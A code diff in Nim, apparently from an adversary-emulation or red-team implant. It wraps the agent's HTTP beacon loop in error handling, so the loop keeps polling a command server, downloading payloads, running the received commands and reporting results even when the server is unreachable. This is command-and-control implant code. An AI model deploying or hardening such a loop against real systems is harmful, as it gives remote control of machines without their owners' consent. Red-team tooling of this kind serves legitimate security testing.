@@ -58,26 +58,29 @@ proc httpCommunicate*(contact: Contact, sleep: int, beacon: Beacon) =
     var newBeacon: Beacon = beacon
     let address: string = contact.address & ":" & intToStr(contact.port)
     while true:
-        var body: string = beaconPost(address = address, beacon = beacon)
-        if len(body) == 0:
-            jitterSleep(sleep, "HTTP")
-            continue
+        try:
+            var body: string = beaconPost(address = address, beacon = beacon)
+            if len(body) == 0:
+                jitterSleep(sleep, "HTTP")
+                continue
 
-        var unmarshalledBeacon: Beacon = unmarshalBeacon(body)
-        if len(unmarshalledBeacon.Links) == 0:
-            # Sleep until the next beacon.
-            jitterSleep(sleep, "HTTP")
-            continue
+            var unmarshalledBeacon: Beacon = unmarshalBeacon(body)
+            if len(unmarshalledBeacon.Links) == 0:
+                # Sleep until the next beacon.
+                jitterSleep(sleep, "HTTP")
+                continue
 
-        for link in unmarshalledBeacon.Links:
-            if len(link.Payload) > 0:
-                requestPayload(link.Payload)
-            var response: CommandExecution = runCommand(executor = link.Executor, message = link.Request)
-            var newLink = link
-            newLink.Response = response.bites
-            newLink.Status = response.status
-            newLink.Pid = response.pid
-            newBeacon.Links.add(newLink)
+            for link in unmarshalledBeacon.Links:
+                if len(link.Payload) > 0:
+                    requestPayload(link.Payload)
+                var response: CommandExecution = runCommand(executor = link.Executor, message = link.Request)
+                var newLink = link
+                newLink.Response = response.bites
+                newLink.Status = response.status
+                newLink.Pid = response.pid
+                newBeacon.Links.add(newLink)
 
-        body = beaconPost(address = address, beacon = newBeacon)
+            body = beaconPost(address = address, beacon = newBeacon)
+        except OSError:
+            logger.log(lvlInfo, fmt"[-] {contact.address} on port {contact.port} is either unavailable or a firewall is blocking traffic.")
         jitterSleep(sleep, "HTTP")
